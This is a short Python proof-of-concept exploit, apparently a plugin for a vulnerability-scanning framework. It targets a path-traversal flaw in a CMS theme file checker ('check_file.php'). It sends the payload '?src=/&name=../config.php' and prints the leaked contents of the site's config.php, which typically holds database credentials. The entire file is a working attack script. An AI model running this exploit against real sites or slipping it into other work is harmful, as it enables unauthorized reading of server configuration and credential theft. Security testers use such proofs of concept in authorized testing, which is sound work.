import requests

from lib.core.data import target


def poc():
    try:
        if not target.url.endswith("dapur/apps/app_theme/libs/check_file.php"):
            print(
                "[*] Please make sure the url end with 'dapur/apps/app_theme/libs/check_file.php'"
            )
            exit()
        payload = "?src=/&name=../config.php"
        url = target.url + payload
        r = requests.get(url)

        start = r.text.find("&lt;?php") + len("&lt;?php")
        end = r.text.find("</textarea>")
        print("[*] Get the config.php :")
        print(r.text[start:end])
    except (KeyError, AttributeError) as e:
        print(
            "\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m"
        )
